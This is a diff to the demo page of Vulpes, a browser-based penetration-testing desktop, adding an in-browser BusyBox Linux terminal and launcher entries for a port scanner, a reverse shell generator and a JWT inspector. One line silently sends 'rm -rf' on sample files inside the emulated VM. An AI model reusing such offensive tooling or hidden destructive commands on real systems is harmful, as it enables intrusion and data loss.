@@ -7,6 +7,10 @@
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="vendor/xterm/xterm.css">
+<script src="vendor/xterm/xterm.js"></script>
+<script src="vendor/xterm/addon-fit.js"></script>
+<script src="vendor/v86/libv86.js"></script>
 <style>
 /* ============================================================================
  * Vulpes desktop - theming + design system
@@ -264,6 +268,7 @@ iframe { display: block; border: 0; width: 100%; height: 100%; }
     font-weight: 800; font-size: var(--fs-xs); line-height: 1;
 }
 .task .monogram { font-size: 9px; }
+.app-icon.fav { border-radius: 5px; object-fit: contain; background: transparent; user-select: none; }
 
 /* ============================= workspace =============================== */
 
@@ -660,19 +665,20 @@ input[type="color"]::-moz-color-swatch { border: 1px solid var(--line-strong); b
 /* ---- static demo extras ---- */
 .window.type-tool .window-content { background: var(--surface); }
 
-/* interactive terminal */
-.demo-term { position:absolute; inset:0; display:flex; flex-direction:column; background:var(--content-bg); }
-.term-tabbar { flex:none; display:flex; align-items:center; gap:var(--sp-1); height:var(--tabbar-h); padding:0 var(--sp-1); background:color-mix(in srgb,var(--content-bg) 70%,#000); border-bottom:1px solid var(--line); }
-.tt { height:calc(var(--tabbar-h) - var(--sp-2)); display:flex; align-items:center; padding:0 var(--sp-3); border-radius:var(--r-sm); color:var(--text-2); font-size:var(--fs-sm); }
-.tt.active { background:var(--primary-soft); color:var(--text); }
-.tt-add { margin-left:auto; padding:0 var(--sp-2); color:var(--text-2); font-size:var(--fs-lg); }
-.term-body { flex:1; overflow:auto; padding:var(--sp-2) var(--sp-3); font-family:var(--font-mono); font-size:13px; line-height:1.55; color:#cdd6f4; cursor:text; }
-.term-log div { white-space:pre-wrap; word-break:break-word; margin-bottom:2px; }
-.term-body .p{color:#cba6f7}.term-body .c{color:#89dceb}.term-body .g{color:#a6e3a1}.term-body .y{color:#f9e2af}.term-body .o{color:#9399b2}
-.term-body b{color:#f5c2e7;font-weight:600}
-.term-input-line { display:flex; align-items:flex-start; }
-.term-prompt { flex:none; white-space:pre; }
-.term-input { flex:1; min-width:0; background:none; border:0; outline:0; color:#cdd6f4; font:inherit; caret-color:var(--primary); padding:0; }
+/* real terminal: a BusyBox Linux booted in-browser with v86 (WASM) */
+.demo-term { position:absolute; inset:0; display:flex; flex-direction:column; background:#0b0b12; }
+.term-head { flex:none; display:flex; align-items:center; gap:var(--sp-2); height:var(--tabbar-h); padding:0 var(--sp-3); background:color-mix(in srgb,var(--content-bg) 70%,#000); border-bottom:1px solid var(--line); font-size:var(--fs-xs); color:var(--text-2); }
+.term-head .dot { width:7px; height:7px; border-radius:50%; background:var(--text-2); flex:none; transition:background .3s; }
+.term-head .dot.on { background:var(--ok); }
+.term-head .ttl { overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+.term-head .tag { margin-left:auto; flex:none; border:1px solid var(--line-strong); border-radius:var(--r-pill); padding:1px var(--sp-2); }
+.term-xterm { flex:1; min-height:0; position:relative; padding:4px 2px 2px 8px; }
+.term-host { position:absolute; inset:4px 2px 2px 8px; }
+.term-host .xterm, .term-host .xterm-viewport, .term-host .xterm-screen { height:100% !important; }
+.term-xterm .xterm-viewport { background:transparent !important; }
+.term-boot { position:absolute; inset:0; z-index:3; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:var(--sp-3); background:#0b0b12; color:var(--text-2); font-size:var(--fs-sm); line-height:1.5; text-align:center; padding:var(--sp-5); }
+.term-boot .spin { width:22px; height:22px; border-radius:50%; border:2px solid var(--line-strong); border-top-color:var(--primary); animation:spin .8s linear infinite; }
+.term-boot.hidden { display:none; }
 
 /* web app (real page in an iframe) */
 .demo-web { position:absolute; inset:0; display:flex; flex-direction:column; background:var(--surface); }
@@ -696,6 +702,96 @@ input[type="color"]::-moz-color-swatch { border: 1px solid var(--line-strong); b
 .tool-explain code, .setting-note code { font-family:var(--font-mono); color:var(--primary); font-size:.92em; }
 .tool-tag { font-size:var(--fs-xs); color:var(--text-2); border:1px solid var(--line-strong); border-radius:var(--r-pill); padding:2px var(--sp-2); }
 .cur { background:var(--primary); color:var(--content-bg); }
+
+/* port scanner */
+.demo-scan { position:absolute; inset:0; display:flex; flex-direction:column; background:var(--surface); color:var(--text); }
+.scan-top { flex:none; display:flex; align-items:flex-end; gap:var(--sp-2); padding:var(--sp-3); border-bottom:1px solid var(--line); }
+.scan-field { display:flex; flex-direction:column; gap:3px; font-size:var(--fs-xs); color:var(--text-2); min-width:0; }
+.scan-field.wide { flex:1; }
+.scan-field span { padding-left:2px; }
+.scan-field input { height:var(--btn-h); padding:0 var(--sp-2); border-radius:var(--r-sm); border:1px solid var(--line-strong); background:var(--surface-2); color:var(--text); font-family:var(--font-mono); font-size:var(--fs-sm); }
+.scan-host { width:110px; }
+.scan-ports { width:100%; }
+.scan-go.stop { background:var(--danger); color:#fff; }
+.scan-note { flex:none; padding:var(--sp-2) var(--sp-3); font-size:var(--fs-xs); color:var(--text-2); line-height:1.5; }
+.scan-note code { font-family:var(--font-mono); color:var(--primary); }
+.scan-bar { flex:none; height:3px; background:var(--surface-2); }
+.scan-bar i { display:block; height:100%; width:0; background:var(--primary); transition:width .15s; }
+.scan-results { flex:1; overflow:auto; padding:var(--sp-1) var(--sp-3) var(--sp-3); font-family:var(--font-mono); font-size:var(--fs-sm); }
+.scan-row { display:grid; grid-template-columns:58px 100px 60px 1fr; align-items:center; gap:var(--sp-2); padding:5px 0; border-bottom:1px solid var(--line); }
+.sr-port { font-weight:700; color:var(--text); }
+.sr-state { font-weight:700; }
+.scan-row.open .sr-state { color:var(--ok); }
+.scan-row.filtered .sr-state { color:#f9e2af; }
+.scan-row.blocked .sr-state, .scan-row.closed .sr-state { color:var(--text-2); }
+.sr-ms { color:var(--text-2); font-size:var(--fs-xs); }
+.sr-note { color:var(--text-2); overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+.scan-empty { color:var(--text-2); padding:var(--sp-4) var(--sp-3); text-align:center; line-height:1.6; }
+.scan-empty code { font-family:var(--font-mono); color:var(--primary); }
+
+/* ---- shared field label for tools ---- */
+.fl { display:flex; flex-direction:column; gap:3px; font-size:var(--fs-xs); color:var(--text-2); }
+.fl span { padding-left:2px; }
+.fl input, .fl select { height:var(--btn-h); padding:0 var(--sp-2); border-radius:var(--r-sm); border:1px solid var(--line-strong); background:var(--surface-2); color:var(--text); font-family:var(--font-mono); font-size:var(--fs-sm); }
+.fl2 { display:flex; flex-direction:column; gap:4px; font-size:var(--fs-xs); color:var(--text-2); }
+
+/* reverse shell generator */
+.demo-rev { position:absolute; inset:0; display:flex; flex-direction:column; background:var(--surface); color:var(--text); }
+.rev-top { flex:none; display:flex; gap:var(--sp-2); padding:var(--sp-3); border-bottom:1px solid var(--line); }
+.rev-top .rv-ip { width:140px; } .rev-top .rv-port { width:80px; }
+.rev-lsnbar { flex:none; display:flex; align-items:center; gap:var(--sp-2); padding:var(--sp-2) var(--sp-3); font-size:var(--fs-sm); color:var(--text-2); border-bottom:1px solid var(--line); }
+.rev-lsnbar code { font-family:var(--font-mono); color:var(--ok); background:var(--surface-2); padding:2px var(--sp-2); border-radius:var(--r-sm); }
+.rev-list { flex:1; overflow:auto; padding:var(--sp-2) var(--sp-3); }
+.rev-row { display:grid; grid-template-columns:104px 1fr auto; align-items:center; gap:var(--sp-2); padding:6px 0; border-bottom:1px solid var(--line); }
+.rev-name { font-size:var(--fs-sm); color:var(--primary); font-weight:700; }
+.rev-code { font-family:var(--font-mono); font-size:var(--fs-xs); white-space:pre-wrap; word-break:break-all; color:var(--text); background:var(--content-bg); padding:6px 8px; border-radius:var(--r-sm); margin:0; }
+.rev-cp { flex:none; color:var(--text-2); font-size:14px; padding:3px 7px; border-radius:var(--r-sm); }
+.rev-cp:hover { background:var(--surface-2); color:var(--text); }
+
+/* jwt inspector */
+.demo-jwt { position:absolute; inset:0; display:flex; flex-direction:column; gap:var(--sp-2); padding:var(--sp-3); background:var(--surface); color:var(--text); overflow:auto; }
+.jwt-token { height:72px; min-height:52px; resize:vertical; width:100%; font-family:var(--font-mono); font-size:var(--fs-sm); padding:var(--sp-2); border-radius:var(--r-sm); border:1px solid var(--line-strong); background:var(--surface-2); color:var(--text); word-break:break-all; }
+.jwt-verify { display:flex; align-items:center; gap:var(--sp-2); }
+.jwt-verify .jwt-secret { flex:1; font-family:var(--font-mono); }
+.jwt-status { font-size:var(--fs-sm); font-weight:700; white-space:nowrap; }
+.jwt-status.ok { color:var(--ok); } .jwt-status.bad { color:var(--danger); } .jwt-status.muted { color:var(--text-2); font-weight:400; }
+.jwt-panes { display:grid; grid-template-columns:1fr 1fr; gap:var(--sp-2); }
+.jwt-pane { background:var(--content-bg); border-radius:var(--r-sm); overflow:hidden; }
+.jwt-h { font-size:var(--fs-xs); color:var(--text-2); padding:5px var(--sp-2); border-bottom:1px solid var(--line); }
+.jwt-header, .jwt-payload { margin:0; padding:var(--sp-2); font-family:var(--font-mono); font-size:var(--fs-xs); white-space:pre-wrap; word-break:break-word; color:var(--text); max-height:220px; overflow:auto; }
+.jwt-claims { display:flex; flex-direction:column; gap:4px; }
+.jwt-note { font-size:var(--fs-xs); padding:5px var(--sp-2); border-radius:var(--r-sm); background:var(--surface-2); line-height:1.4; }
+.jwt-note.bad { color:var(--danger); box-shadow:inset 2px 0 var(--danger); }
+.jwt-note.ok { color:var(--ok); } .jwt-note.muted { color:var(--text-2); }
+
+/* browser leaks */
+.demo-leak { position:absolute; inset:0; display:flex; flex-direction:column; background:var(--surface); color:var(--text); }
+.leak-note { flex:none; padding:var(--sp-3); font-size:var(--fs-xs); color:var(--text-2); line-height:1.5; border-bottom:1px solid var(--line); }
+.leak-grid { flex:1; overflow:auto; padding:var(--sp-1) var(--sp-3) var(--sp-3); }
+.leak-row { display:grid; grid-template-columns:148px 1fr; gap:var(--sp-2); padding:6px 0; border-bottom:1px solid var(--line); align-items:baseline; }
+.leak-row .lk { font-size:var(--fs-sm); color:var(--text-2); }
+.leak-row .lv { font-family:var(--font-mono); font-size:var(--fs-xs); color:var(--text); word-break:break-word; }
+
+/* http client */
+.demo-http { position:absolute; inset:0; display:flex; flex-direction:column; background:var(--surface); color:var(--text); }
+.http-bar { flex:none; display:flex; gap:var(--sp-2); padding:var(--sp-3); border-bottom:1px solid var(--line); }
+.http-bar .h-method { width:94px; } .http-bar .h-url { flex:1; font-family:var(--font-mono); }
+.http-tabs { flex:none; display:flex; gap:var(--sp-1); padding:var(--sp-2) var(--sp-3) 0; }
+.htb { font-size:var(--fs-sm); color:var(--text-2); padding:4px var(--sp-3); border-radius:var(--r-sm) var(--r-sm) 0 0; }
+.htb.active { color:var(--text); background:var(--surface-2); }
+.http-pane { flex:none; padding:var(--sp-3); border-bottom:1px solid var(--line); }
+.kv-rows { display:flex; flex-direction:column; gap:var(--sp-1); margin-bottom:var(--sp-2); }
+.kv-row { display:flex; gap:var(--sp-1); }
+.kv-row .kv-k { width:40%; font-family:var(--font-mono); } .kv-row .kv-v { flex:1; font-family:var(--font-mono); }
+.kv-del { flex:none; width:28px; color:var(--text-2); border-radius:var(--r-sm); }
+.kv-del:hover { background:var(--danger); color:#fff; }
+.h-body { width:100%; height:92px; resize:vertical; font-family:var(--font-mono); font-size:var(--fs-sm); padding:var(--sp-2); }
+.http-note { flex:none; padding:var(--sp-2) var(--sp-3); font-size:var(--fs-xs); color:var(--text-2); line-height:1.5; }
+.http-resp { flex:1; min-height:0; display:flex; flex-direction:column; border-top:1px solid var(--line); }
+.hr-status { flex:none; display:flex; gap:var(--sp-2); align-items:center; padding:var(--sp-2) var(--sp-3); font-size:var(--fs-sm); }
+.hr-code { font-weight:700; } .hr-code.ok { color:var(--ok); } .hr-code.bad { color:var(--danger); }
+.hr-ms { color:var(--text-2); font-size:var(--fs-xs); }
+.hr-body { flex:1; margin:0; overflow:auto; padding:0 var(--sp-3) var(--sp-3); font-family:var(--font-mono); font-size:var(--fs-xs); white-space:pre-wrap; word-break:break-word; color:var(--text); }
 
 </style>
 </head>
@@ -734,7 +830,7 @@ input[type="color"]::-moz-color-swatch { border: 1px solid var(--line-strong); b
       </select></div>
     <div class="setting"><label for="accent">Accent color</label>
       <div class="color-row"><input type="color" id="accent" value="#cba6f7"><button class="link-btn" id="accentReset">Reset</button></div></div>
-    <p class="setting-note">Static showcase of Vulpes, a web desktop for penetration testing. Nothing here talks to a server: the terminal is faked and the tools are not actually running. In the real Vulpes every app streams a live process. Open things from the launcher, type <code>help</code> in the terminal, and drag the windows around.</p>
+    <p class="setting-note">Local-only showcase of Vulpes, a web desktop for penetration testing. The <b>terminal is a real BusyBox Linux</b> booted in your browser with v86 (WebAssembly) &mdash; try <code>ls</code>, <code>uname -a</code>, <code>vi</code>. It has no network, so it is entirely local. The GUI tools (Caido, Wireshark&hellip;) only stream live in the full Vulpes; here they explain themselves. Open things from the launcher and drag the windows around.</p>
   </section>
 
   <div class="toasts" id="toasts"></div>
@@ -753,50 +849,117 @@ input[type="color"]::-moz-color-swatch { border: 1px solid var(--line-strong); b
   // ---- demo apps ----
   const APPS = [
     { id:'terminal', name:'Terminal', mono:'>_', type:'terminal', pinned:true },
-    { id:'caido', name:'Caido', mono:'CA', type:'tool', gui:true, pinned:true, blurb:'Modern web-security auditing proxy, a Burp alternative.' },
-    { id:'wireshark', name:'Wireshark', mono:'WS', type:'tool', gui:true, blurb:'Live network packet capture and protocol analysis.' },
-    { id:'burp', name:'Burp Suite', mono:'BP', type:'tool', gui:true, blurb:'The classic web application security testing suite.' },
-    { id:'wstg', name:'OWASP WSTG', mono:'OW', type:'web', url:'https://wstg.owasp.org/latest/', pinned:true },
-    { id:'gtfobins', name:'GTFOBins', mono:'GB', type:'web', url:'https://gtfobins.github.io/' },
-    { id:'payloads', name:'PayloadsAllTheThings', mono:'PA', type:'web', url:'https://swisskyrepo.github.io/PayloadsAllTheThings/' },
-    { id:'github', name:'Vulpes on GitHub', mono:'GH', type:'link', url:'https://github.com/FenrirSec/vulpes' },
+    { id:'portscan', name:'Port Scanner', mono:'PS', icon:'vendor/icons/portscan.svg', type:'scanner', pinned:true },
+    { id:'revshell', name:'Reverse Shell', mono:'RS', icon:'vendor/icons/revshell.svg', type:'revshell', pinned:true },
+    { id:'httpclient', name:'HTTP Client', mono:'HC', icon:'vendor/icons/httpclient.svg', type:'http', pinned:true },
+    { id:'jwt', name:'JWT Inspector', mono:'JW', icon:'vendor/icons/jwt.svg', type:'jwt' },
+    { id:'leak', name:'Browser Leaks', mono:'BL', icon:'vendor/icons/leak.svg', type:'leak' },
+    { id:'caido', name:'Caido', mono:'CA', icon:'vendor/icons/caido.png', type:'tool', gui:true, pinned:true, blurb:'Modern web-security auditing proxy, a Burp alternative.' },
+    { id:'wireshark', name:'Wireshark', mono:'WS', icon:'vendor/icons/wireshark.png', type:'tool', gui:true, blurb:'Live network packet capture and protocol analysis.' },
+    { id:'burp', name:'Burp Suite', mono:'BP', icon:'vendor/icons/burp.png', type:'tool', gui:true, blurb:'The classic web application security testing suite.' },
+    { id:'wstg', name:'OWASP WSTG', mono:'OW', icon:'vendor/icons/wstg.png', type:'web', url:'https://wstg.owasp.org/latest/', pinned:true },
+    { id:'gtfobins', name:'GTFOBins', mono:'GB', icon:'vendor/icons/gtfobins.png', type:'web', url:'https://gtfobins.github.io/' },
+    { id:'payloads', name:'PayloadsAllTheThings', mono:'PA', icon:'vendor/icons/payloads.png', type:'web', url:'https://swisskyrepo.github.io/PayloadsAllTheThings/' },
+    { id:'github', name:'Vulpes on GitHub', mono:'GH', icon:'vendor/icons/github.png', type:'link', url:'https://github.com/FenrirSec/vulpes' },
   ];
-  const TOOL_NAMES = ['caido', 'wireshark', 'burpsuite', 'nuclei', 'rustscan', 'sqlmap', 'mitmproxy', 'gitleaks', 'ncrack', 'metasploit', 'seclists', 'searchsploit'];
-
-  // ---- fake terminal command set ----
-  const FS = ['loot/', 'scans/', 'notes.md', 'creds.txt', 'flag.txt'];
-  function runCommand(raw) {
-    const line = raw.trim();
-    if (!line) return '';
-    const [cmd, ...args] = line.split(/\s+/);
-    const a = args.join(' ');
-    switch (cmd) {
-      case 'help': return 'Faked commands in this demo:\n  <b>help ls pwd whoami id uname date</b>\n  <b>nmap nuclei vulpkg cat echo clear</b>\nEverything else prints "command not found". The real Vulpes runs actual tools.';
-      case 'ls': return FS.join('   ');
-      case 'll': return FS.map(f => '<span class="o">-rw-r--r--</span> root root  ' + (f.endsWith('/') ? '<span class="c">'+f+'</span>' : f)).join('\n');
-      case 'pwd': return '/root';
-      case 'whoami': return 'root';
-      case 'id': return 'uid=0(root) gid=0(root) groups=0(root)';
-      case 'uname': return 'Linux vulpes 6.6.0-vulpes #1 SMP x86_64 GNU/Linux';
-      case 'date': return new Date().toString();
-      case 'echo': return esc(a);
-      case 'cat':
-        if (a === 'flag.txt') return '<span class="g">FLAG{this_is_only_a_demo_run_vulpes_for_real}</span>';
-        if (a === 'creds.txt') return 'admin:hunter2\nroot:toor';
-        if (a === 'notes.md') return '# Engagement notes\n- 10.10.14.7 is the target\n- try the admin panel on :80';
-        if (!a) return 'cat: missing operand';
-        return 'cat: ' + esc(a) + ': No such file or directory';
-      case 'nmap': return '<span class="g">Starting Nmap 7.95</span> ( https://nmap.org )\nNmap scan report for ' + (esc(a.split(' ').pop()) || '10.10.14.7') + '\n<span class="c">22/tcp</span>  open  ssh      OpenSSH 9.6\n<span class="c">80/tcp</span>  open  http     nginx 1.27\n<span class="c">443/tcp</span> open  ssl/http nginx 1.27\n<span class="o">(demo output - the real nmap runs in Vulpes)</span>';
-      case 'nuclei': return '<span class="p">[CVE-2024-1234]</span> <span class="y">[high]</span> Exposed admin panel\n<span class="p">[tech-detect]</span> <span class="c">[info]</span> nginx, php\n<span class="o">(demo output - nuclei actually runs in Vulpes)</span>';
-      case 'vulpkg':
-        if (args[0] === 'list') return 'Installed tools (via vulpkg):\n' + TOOL_NAMES.join(', ') + ', ...';
-        if (args[0] === 'install') return '<span class="y">vulpkg: install needs the Vulpes backend</span> - this is a static demo.';
-        return 'usage: vulpkg list | install <name>   (install only works in real Vulpes)';
-      case 'clear': return '\x00clear';
-      case 'sudo': return runCommand(a) ;
-      default: return '<span class="y">' + esc(cmd) + ': command not found</span> - this is a static demo. Real commands run in Vulpes.';
-    }
+  // an app's icon: real favicon when we have one, else a monogram tile
+  const iconHTML = (app) => app.icon
+    ? `<img class="app-icon fav" src="${app.icon}" alt="" draggable="false">`
+    : `<span class="app-icon monogram">${app.mono}</span>`;
+  // a Vulpes neofetch-style banner (matches the real Vulpes terminal's)
+  function vulpesBanner() {
+    const E = '\x1b[', m = E + '1;38;5;183m', f = E + '38;5;183m', dd = E + '38;5;245m', r = E + '0m';
+    const pad = (s) => (s + '               ').slice(0, 15);
+    const rows = [
+      ['  █▌     ▐█', `${m}root${dd}@${m}vulpes${r}`],
+      ['  ▝█▖   ▗█▘', `${dd}---------------${r}`],
+      ['   ▝█▖ ▗█▘',  `${m}OS${r}        Vulpes`],
+      ['    ▝█▄█▘',   `${m}Base${r}      BusyBox Linux`],
+      ['      ▀',     `${m}Kernel${r}    6.8.12`],
+      ['',            `${m}Shell${r}     ash`],
+      ['',            `${m}Terminal${r}  v86 (WASM)`],
+      ['',            `${m}Packages${r}  BusyBox base`],
+      ['',            `${m}Network${r}   none (local only)`],
+      ['',            `${m}Theme${r}     Catppuccin Mocha`],
+    ];
+    let out = '\r\n';
+    for (const [art, info] of rows) out += f + pad(art) + r + ' ' + info + '\r\n';
+    const blocks = ['210','215','223','150','115','111','183','218'].map(c => E + '38;5;' + c + 'm███').join('');
+    return out + '   ' + blocks + r + '\r\n\r\n';
   }
+
+  // ---- real terminal: one BusyBox Linux booted in-browser via v86 (WASM) ----
+  // A single shared VM backs the Terminal app. It boots lazily on first open,
+  // keeps running, and streams its serial console to an xterm.js front-end.
+  const VM = {
+    emu: null, booted: false, starting: false, backlog: '',
+    base: 'vendor/v86/', listeners: new Set(), bootCbs: new Set(),
+    _line: '', _filtering: true, _prompts: 0,
+    // boot-time lines to hide: the host9p /mnt mount error, the v86 image's
+    // networking/transfer hints, and the echo of the cleanup command below.
+    // A Vulpes banner is printed in their place once the shell is up.
+    _noise: /host9p|test\.lua|\/root\/tests|rm -rf \/root|udhcpc|Enable networking|Files send via emulator/,
+    start() {
+      if (this.starting) return; this.starting = true;
+      const emu = new V86({
+        wasm_path: this.base + 'v86.wasm',
+        memory_size: 128 * 1024 * 1024,
+        vga_memory_size: 2 * 1024 * 1024,
+        bios: { url: this.base + 'seabios.bin' },
+        vga_bios: { url: this.base + 'vgabios.bin' },
+        bzimage: { url: this.base + 'buildroot-bzimage68.bin' },
+        cmdline: 'tsc=reliable mitigations=off random.trust_cpu=on console=ttyS0',
+        autostart: true,
+        // We drive the VM purely over its serial console, so stop v86 from
+        // grabbing the page's mouse/keyboard: its document-level mousedown
+        // handler calls preventDefault(), which otherwise blocks every input
+        // field on the desktop from receiving focus on click.
+        disable_keyboard: true,
+        disable_mouse: true,
+      });
+      this.emu = emu;
+      emu.add_listener('serial0-output-byte', (b) => this._onByte(String.fromCharCode(b)));
+      // safety net: never leave the boot overlay stuck
+      setTimeout(() => this._finishBoot(), 60000);
+    },
+    _emit(s) {
+      this.backlog += s;
+      if (this.backlog.length > 1 << 17) this.backlog = this.backlog.slice(-(1 << 17));
+      this.listeners.forEach(fn => fn(s));
+    },
+    _onByte(ch) {
+      if (!this._filtering) { this._emit(ch); return; }   // raw once booted
+      this._line += ch;
+      if (ch === '\n') {                                   // a full line: drop it if noise
+        if (!this._noise.test(this._line)) this._emit(this._line);
+        this._line = '';
+        return;
+      }
+      if (/[%#$] $/.test(this._line.slice(-3))) {          // a shell prompt is waiting
+        this._prompts++;
+        if (this._prompts === 1) {
+          // Linux is up: quietly remove the stock image's leftover sample files,
+          // then show the clean prompt that follows.
+          this.send('rm -rf /root/test.lua /root/tests 2>/dev/null\n');
+          this._line = '';
+          setTimeout(() => this._finishBoot(), 2500);      // fallback if no 2nd prompt
+        } else {
+          this._finishBoot();        // emits the banner, then this prompt line
+        }
+      }
+    },
+    _finishBoot() {
+      if (!this._filtering) return;
+      this._filtering = false;
+      this._emit(vulpesBanner());                       // Vulpes neofetch, then the prompt
+      if (this._line) { this._emit(this._line); this._line = ''; }
+      this._markBooted();
+    },
+    _markBooted() { if (this.booted) return; this.booted = true; this.bootCbs.forEach(fn => { try { fn(); } catch (e) {} }); this.bootCbs.clear(); },
+    onBoot(fn) { if (this.booted) fn(); else this.bootCbs.add(fn); },
+    send(s) { if (this.emu) this.emu.serial0_send(s); },
+    attach(fn) { this.listeners.add(fn); return () => this.listeners.delete(fn); },
+  };
 
   // ---- launcher ----
   function renderLauncher() {
@@ -804,7 +967,7 @@ input[type="color"]::-moz-color-swatch { border: 1px solid var(--line-strong); b
     APPS.forEach(a => {
       const b = document.createElement('button');
       b.className = 'app-item';
-      b.innerHTML = `<span class="app-icon monogram">${a.mono}</span><span class="app-item-name">${a.name}</span>`;
+      b.innerHTML = `${iconHTML(a)}<span class="app-item-name">${a.name}</span>`;
       b.dataset.search = a.name.toLowerCase();
       b.addEventListener('click', () => { openWindow(a); closePop(); });
       grid.appendChild(b);
@@ -813,7 +976,7 @@ input[type="color"]::-moz-color-swatch { border: 1px solid var(--line-strong); b
     APPS.filter(a => a.pinned).forEach(a => {
       const p = document.createElement('button');
       p.className = 'pin'; p.title = a.name;
-      p.innerHTML = `<span class="app-icon monogram">${a.mono}</span>`;
+      p.innerHTML = iconHTML(a);
       p.addEventListener('click', () => openWindow(a));
       dock.appendChild(p);
     });
@@ -826,7 +989,8 @@ input[type="color"]::-moz-color-swatch { border: 1px solid var(--line-strong); b
     if (windows.has(app.id)) { focus(windows.get(app.id)); return; }
     const w = document.createElement('div');
     w.className = 'window type-' + (app.type === 'terminal' ? 'terminal' : app.type === 'web' ? 'url' : 'tool');
-    const dim = app.type === 'web' ? { w: 760, h: 500 } : app.type === 'terminal' ? { w: 620, h: 380 } : { w: 440, h: 320 };
+    const SIZES = { web:{w:760,h:500}, terminal:{w:720,h:440}, scanner:{w:580,h:500}, revshell:{w:660,h:540}, http:{w:740,h:560}, jwt:{w:640,h:560}, leak:{w:580,h:580} };
+    const dim = SIZES[app.type] || { w: 440, h: 320 };
     offset = (offset + 28) % 140;
     w.style.cssText = `left:${90 + offset}px;top:${70 + offset}px;width:${dim.w}px;height:${dim.h}px;z-index:${++z}`;
     w.innerHTML = `
@@ -844,6 +1008,11 @@ input[type="color"]::-moz-color-swatch { border: 1px solid var(--line-strong); b
     const content = w.querySelector('.window-content');
     if (app.type === 'terminal') content.appendChild(makeTerminal(w));
     else if (app.type === 'web') content.appendChild(makeWeb(app));
+    else if (app.type === 'scanner') content.appendChild(makeScanner(app));
+    else if (app.type === 'revshell') content.appendChild(makeRevShell(app));
+    else if (app.type === 'http') content.appendChild(makeHttpClient(app));
+    else if (app.type === 'jwt') content.appendChild(makeJwt(app));
+    else if (app.type === 'leak') content.appendChild(makeLeaks(app));
     else content.appendChild(makeToolView(app));
 
     const obj = { id: app.id, el: w, app };
@@ -857,8 +1026,8 @@ input[type="color"]::-moz-color-swatch { border: 1px solid var(--line-strong); b
     renderTasks();
     w.animate([{ opacity: 0, transform: 'scale(.98)' }, { opacity: 1, transform: 'none' }], { duration: 140, easing: 'cubic-bezier(.2,.8,.2,1)' });
   }
-  function closeWindow(o) { o.el.remove(); windows.delete(o.id); renderTasks(); }
-  function focus(o) { active = o; windows.forEach(x => x.el.classList.toggle('active', x === o)); o.el.style.zIndex = ++z; o.el.style.display = ''; o.el.classList.remove('mini'); const inp = o.el.querySelector('.term-input'); if (inp) setTimeout(() => inp.focus(), 0); renderTasks(); }
+  function closeWindow(o) { if (o.el._termCleanup) o.el._termCleanup(); o.el.remove(); windows.delete(o.id); renderTasks(); }
+  function focus(o) { active = o; windows.forEach(x => x.el.classList.toggle('active', x === o)); o.el.style.zIndex = ++z; o.el.style.display = ''; o.el.classList.remove('mini'); if (o.el._termFocus) setTimeout(() => o.el._termFocus(), 0); renderTasks(); }
   function toggleMax(w) { if (w.dataset.max) { w.style.cssText = w.dataset.max; w.classList.remove('maximized'); delete w.dataset.max; } else { w.dataset.max = w.style.cssText; w.classList.add('maximized'); w.style.left = '0'; w.style.top = '0'; w.style.width = '100%'; w.style.height = '100%'; } }
   function drag(w, handle) {
     handle.addEventListener('pointerdown', (e) => {
@@ -871,49 +1040,62 @@ input[type="color"]::-moz-color-swatch { border: 1px solid var(--line-strong); b
     });
   }
 
-  // ---- interactive terminal ----
+  // ---- real terminal (xterm.js front-end on the shared v86 Linux VM) ----
   function makeTerminal(win) {
     const d = document.createElement('div'); d.className = 'demo-term';
-    d.innerHTML = `<div class="term-tabbar"><span class="tt active">Terminal 1</span><span class="tt-add">+</span></div><div class="term-body"><div class="term-log"></div><div class="term-input-line"><span class="term-prompt"></span><input class="term-input" spellcheck="false" autocomplete="off" aria-label="terminal input"></div></div>`;
-    const log = d.querySelector('.term-log');
-    const body = d.querySelector('.term-body');
-    const input = d.querySelector('.term-input');
-    d.querySelector('.term-prompt').innerHTML = '<span class="p">❯</span> ';
-    const hist = []; let hi = 0;
-    function PROMPT() { return `<span class="p">vulpes</span><span class="o">@</span><span class="c">fenrir</span> <span class="y">~</span>\n<span class="p">❯</span> `; }
-    function append(html) { const div = document.createElement('div'); div.innerHTML = html; log.appendChild(div); body.scrollTop = body.scrollHeight; }
-    function submit() {
-      const val = input.value; input.value = '';
-      append(PROMPT() + esc(val));
-      if (val.trim()) hist.push(val); hi = hist.length;
-      const out = runCommand(val);
-      if (out === '\x00clear') { log.innerHTML = ''; return; }
-      if (out) append(out);
-      body.scrollTop = body.scrollHeight;
-    }
-    input.addEventListener('keydown', (e) => {
-      if (e.key === 'Enter') { e.preventDefault(); submit(); }
-      else if (e.key === 'ArrowUp') { e.preventDefault(); if (hi > 0) input.value = hist[--hi] || ''; }
-      else if (e.key === 'ArrowDown') { e.preventDefault(); if (hi < hist.length) input.value = hist[++hi] || ''; }
+    d.innerHTML = `
+      <div class="term-head"><span class="dot"></span><span class="ttl">BusyBox Linux (x86) &mdash; booted in your browser with v86 (WebAssembly)</span><span class="tag">local only &middot; no network</span></div>
+      <div class="term-xterm"><div class="term-host"></div>
+        <div class="term-boot"><div class="spin"></div><div>Booting a real Linux kernel&hellip;<br>first run fetches ~12&nbsp;MB, then it is fully offline</div></div>
+      </div>`;
+    const host = d.querySelector('.term-host');
+    const bootEl = d.querySelector('.term-boot');
+    const dot = d.querySelector('.term-head .dot');
+
+    const term = new Terminal({
+      fontFamily: '"JetBrains Mono", ui-monospace, monospace',
+      fontSize: 13, lineHeight: 1.15, cursorBlink: true, scrollback: 2000,
+      theme: {
+        background: '#0b0b12', foreground: '#cdd6f4', cursor: '#cba6f7',
+        selectionBackground: '#45475a',
+        black: '#45475a', red: '#f38ba8', green: '#a6e3a1', yellow: '#f9e2af',
+        blue: '#89b4fa', magenta: '#cba6f7', cyan: '#94e2d5', white: '#bac2de',
+        brightBlack: '#585b70', brightWhite: '#cdd6f4',
+      },
     });
-    body.addEventListener('pointerdown', () => setTimeout(() => input.focus(), 0));
-    // auto-intro
-    const INTRO = [
-      ['cmd', 'whoami'], ['out', 'root'],
-      ['cmd', 'nmap -sV 10.10.14.7'],
-      ['out', runCommand('nmap 10.10.14.7')],
-      ['hint', 'Type <b>help</b> to see the faked commands, or open a web tool from the launcher.'],
-    ];
-    let i = 0;
-    (function play() {
